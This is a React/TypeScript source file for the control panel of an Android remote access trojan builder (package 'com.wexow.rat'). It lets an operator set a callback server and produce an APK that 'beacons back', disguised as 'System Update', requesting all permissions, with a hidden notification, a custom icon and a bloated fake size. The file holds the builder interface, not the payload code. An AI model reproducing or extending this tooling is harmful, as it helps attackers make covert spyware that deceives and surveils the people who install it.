import { useState, useRef } from 'react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Switch } from '@/components/ui/switch'
import { Badge } from '@/components/ui/badge'
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
  CardDescription,
} from '@/components/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Hammer, Loader2, Download, Terminal, PackageCheck, ImagePlus, X } from 'lucide-react'
import { useAppDispatch, useAppSelector } from '@/store/hooks'
import { emitBuildApk, emitBuildApkAdvanced } from '@/lib/socket'
import { buildStart } from '@/store/slices/build-slice'
import { apiUrl } from '@/lib/config'

const DEFAULT_HOST = 'example.com'

export function BuilderPanel() {
  // ── Simple build ──
  const [sHost, setSHost] = useState(DEFAULT_HOST)
  const [sPort, setSPort] = useState('443')

  // ── Advanced build ──
  const [hosts, setHosts] = useState(DEFAULT_HOST)
  const [appName, setAppName] = useState('System Update')    
  const [appVersion, setAppVersion] = useState('1.0')
  const [packageName, setPackageName] = useState('com.wexow.rat')
  const [notifTitle, setNotifTitle] = useState('System Update')
  const [notifText, setNotifText] = useState('Running...')
  const [notifEnabled, setNotifEnabled] = useState(false) 
  const [allPerms, setAllPerms] = useState(true)
  const [fakeEnabled, setFakeEnabled] = useState(false)
  const [fakeSize, setFakeSize] = useState('5')
  const [icon, setIcon] = useState<string | null>(null)
  const iconInput = useRef<HTMLInputElement>(null)

  const dispatch = useAppDispatch()
  const { status, logs, filename, error } = useAppSelector((s) => s.build)
  const building = status === 'building'

  const onIcon = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    e.target.value = ''
    if (!file) return
    const r = new FileReader()
    r.onload = () => setIcon(String(r.result || ''))
    r.readAsDataURL(file)
  }

  const buildSimple = () => {
    dispatch(buildStart())
    emitBuildApk({ ip: sHost, port: sPort })
  }

  const buildAdvanced = () => {
    dispatch(buildStart())
    emitBuildApkAdvanced({
      hosts: hosts.trim(),
      appName: appName.trim() || 'System Update',
      appVersion: appVersion.trim() || '1.0',
      packageName: packageName.trim() || 'com.wexow.rat',
      notifTitle: notifTitle.trim(),
      notifText: notifText.trim(),
      notifEnabled,
      fakeSize: fakeEnabled ? parseInt(fakeSize, 10) || 0 : 0,
      icon,
      permissions: allPerms ? 'ALL' : [],
    })
  }

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-semibold tracking-tight text-zinc-50">
          APK Builder
        </h1>
        <p className="text-sm text-zinc-500">
          Generate a payload that beacons back to your server.
        </p>
      </div>

      <div className="grid gap-6 lg:grid-cols-5">
        <Card className="bg-zinc-900/60 border-white/10 lg:col-span-2">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-zinc-100">
              <Hammer className="h-4 w-4 text-emerald-400" /> Configuration
            </CardTitle>
            <CardDescription>Pick a build preset.</CardDescription>
          </CardHeader>
          <CardContent>
            <Tabs defaultValue="advanced">
              <TabsList className="grid grid-cols-2 bg-zinc-950/60 border border-white/10">
                <TabsTrigger value="simple">Simple</TabsTrigger>
                <TabsTrigger value="advanced">Advanced</TabsTrigger>
              </TabsList>

              <TabsContent value="simple" className="space-y-4 mt-4">
                <Field label="Server Host">
                  <Input
                    value={sHost}
                    onChange={(e) => setSHost(e.target.value)}
                    placeholder={DEFAULT_HOST}
                    className="bg-black/40 border-white/10 font-mono"
                  />
                </Field>
                <Field label="Port">
                  <Input
                    value={sPort}
                    onChange={(e) => setSPort(e.target.value.replace(/[^0-9]/g, ''))}
                    placeholder="443"
                    className="bg-black/40 border-white/10 font-mono"
                  />
                </Field>
                <BuildButton building={building} onClick={buildSimple} />
              </TabsContent>

              <TabsContent value="advanced" className="space-y-4 mt-4">
                <Field label="Connection Host(s)" required>
                  <Input
                    value={hosts}
                    onChange={(e) => setHosts(e.target.value)}
                    placeholder={DEFAULT_HOST}
                    className="bg-black/40 border-white/10 font-mono"
                  />
                  <Hint>
                    e.g. <code>example.com</code>
                  </Hint>
                </Field>

                <div className="grid grid-cols-2 gap-3">
                  <Field label="App Name">
                    <Input
                      value={appName}
                      onChange={(e) => setAppName(e.target.value)}
                      className="bg-black/40 border-white/10"
                    />
                  </Field>
                  <Field label="App Version">
                    <Input
                      value={appVersion}
                      onChange={(e) => setAppVersion(e.target.value)}
                      className="bg-black/40 border-white/10"
                    />
                  </Field>
                  <Field label="Package Name">
                    <Input
                      value={packageName}
                      onChange={(e) => setPackageName(e.target.value)}
                      className="bg-black/40 border-white/10 font-mono"
                    />
                  </Field>
                  <Field label="Fake Size (MB)">
                    <Input
                      value={fakeSize}
                      onChange={(e) => setFakeSize(e.target.value.replace(/[^0-9]/g, ''))}
                      disabled={!fakeEnabled}
                      className="bg-black/40 border-white/10 font-mono"
                    />
                  </Field>
                </div>

                {/* ⭐ Notification Settings */}
                <div className="space-y-3 rounded-lg border border-white/10 bg-black/20 p-3">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-zinc-200">
                      Notification
                    </span>
                    <span className={`text-[10px] ${notifEnabled ? 'text-amber-400' : 'text-emerald-400'}`}>
                      {notifEnabled ? '⚠️ VISIBLE' : '✅ HIDDEN'}
                    </span>
                  </div>

                  <Toggle
                    label="Show notification"
                    checked={notifEnabled}
                    onChange={setNotifEnabled}
                  />

                  <Field label="Notification Title">
                    <Input
                      value={notifTitle}
                      onChange={(e) => setNotifTitle(e.target.value)}
                      disabled={!notifEnabled}
                      placeholder="System Update"
                      className="bg-black/40 border-white/10 disabled:opacity-40"
                    />
                  </Field>

                  <Field label="Notification Text">
                    <Input
                      value={notifText}
                      onChange={(e) => setNotifText(e.target.value)}
                      disabled={!notifEnabled}
                      placeholder="Running..."
                      className="bg-black/40 border-white/10 disabled:opacity-40"
                    />
                  </Field>

                  <p className="text-[10px] text-zinc-500">
                    {notifEnabled 
                      ? 'The notification will be visible in the status bar.'
                      : 'The notification will be completely hidden from the user.'}
                  </p>
                </div>

                {/* Other toggles */}
                <div className="space-y-2 rounded-lg border border-white/10 bg-black/20 p-3">
                  <Toggle
                    label="All permissions"
                    checked={allPerms}
                    onChange={setAllPerms}
                  />
                  <Toggle
                    label="Fake size bloating"
                    checked={fakeEnabled}
                    onChange={setFakeEnabled}
                  />
                </div>

                <Field label="Custom Icon (optional)">
                  <div className="flex items-center gap-3">
                    <button
                      type="button"
                      onClick={() => iconInput.current?.click()}
                      className="grid h-16 w-16 place-items-center overflow-hidden rounded-lg border border-white/10 bg-black/40 hover:border-emerald-500/40"
                    >
                      {icon ? (
                        <img src={icon} alt="icon" className="h-full w-full object-contain" />
                      ) : (
                        <ImagePlus className="h-5 w-5 text-zinc-600" />
                      )}
                    </button>
                    <input
                      ref={iconInput}
                      type="file"
                      accept="image/*"
                      className="hidden"
                      onChange={onIcon}
                    />
                    {icon && (
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        onClick={() => setIcon(null)}
                        className="text-zinc-400 hover:text-rose-300"
                      >
                        <X className="h-3.5 w-3.5" /> Remove
                      </Button>
                    )}
                  </div>
                </Field>

                <BuildButton building={building} onClick={buildAdvanced} label="Build Advanced APK" />
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>

        <Card className="bg-zinc-900/60 border-white/10 lg:col-span-3">
          <CardHeader className="flex-row items-center justify-between">
            <div>
              <CardTitle className="flex items-center gap-2 text-zinc-100">
                <Terminal className="h-4 w-4 text-emerald-400" /> Build Output
              </CardTitle>
              <CardDescription>Streaming build logs.</CardDescription>
            </div>
            <StatusBadge status={status} />
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="h-72 overflow-y-auto scrollbar-emerald rounded-lg border border-white/10 bg-black/50 p-3 font-mono text-[12px] leading-relaxed">
              {logs.length === 0 ? (
                <span className="text-zinc-600 italic">
                  No build started yet. Configure and click Build.
                </span>
              ) : (
                logs.map((l, i) => (
                  <div
                    key={i}
                    className={`whitespace-pre-wrap ${
                      l.includes('FAIL')
                        ? 'text-rose-400'
                        : l.includes('SUCCESS') || l.includes('complete')
                          ? 'text-emerald-400'
                          : 'text-zinc-300'
                    }`}
                  >
                    {l}
                  </div>
                ))
              )}
            </div>

            {status === 'success' && filename && (
              <a
                href={apiUrl(`/output/${filename}`)}
                target="_blank"
                rel="noreferrer"
                className="inline-flex w-full"
              >
                <Button className="w-full bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30 hover:bg-emerald-500 hover:text-zinc-950 font-semibold">
                  <Download className="h-4 w-4" /> Download {filename}
                </Button>
              </a>
            )}
            {status === 'failed' && error && (
              <div className="rounded-lg border border-rose-500/30 bg-rose-500/10 px-3 py-2 text-sm text-rose-300">
                Build failed: {error}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  )
}

function Field({
  label,
  children,
  required,
}: {
  label: string
  children: React.ReactNode
  required?: boolean
}) {
  return (
    <div className="space-y-1.5">
      <Label className="text-xs uppercase tracking-wider text-zinc-500">
        {label} {required && <span className="text-rose-400">*</span>}
      </Label>
      {children}
    </div>
  )
}

function Hint({ children }: { children: React.ReactNode }) {
  return <p className="text-[11px] text-zinc-600">{children}</p>
}

function Toggle({
  label,
  checked,
  onChange,
}: {
  label: string
  checked: boolean
  onChange: (v: boolean) => void
}) {
  return (
    <div className="flex items-center justify-between">
      <span className="text-xs text-zinc-300">{label}</span>
      <Switch checked={checked} onCheckedChange={onChange} />
    </div>
  )
}

function BuildButton({
  building,
  onClick,
  label = 'Build APK',
}: {
  building: boolean
  onClick: () => void
  label?: string
}) {
  return (
    <Button
      onClick={onClick}
      disabled={building}
      className="w-full bg-emerald-500 hover:bg-emerald-400 text-zinc-950 font-semibold"
    >
      {building ? (
        <>
          <Loader2 className="h-4 w-4 animate-spin" /> Building…
        </>
      ) : (
        <>
          <Hammer className="h-4 w-4" /> {label}
        </>
      )}
    </Button>
  )
}

function StatusBadge({ status }: { status: string }) {
  if (status === 'building')
    return (
      <Badge className="bg-amber-500/15 text-amber-300 ring-1 ring-amber-500/30">
        <Loader2 className="h-3 w-3 mr-1 animate-spin" /> Building
      </Badge>
    )
  if (status === 'success')
    return (
      <Badge className="bg-emerald-500/15 text-emerald-300 ring-1 ring-emerald-500/30">
        <PackageCheck className="h-3 w-3 mr-1" /> Success
      </Badge>
    )
  if (status === 'failed')
    return (
      <Badge className="bg-rose-500/15 text-rose-300 ring-1 ring-rose-500/30">
        Failed
      </Badge>
    )
  return (
    <Badge className="bg-zinc-800 text-zinc-400 ring-1 ring-white/10">Idle</Badge>
  )
}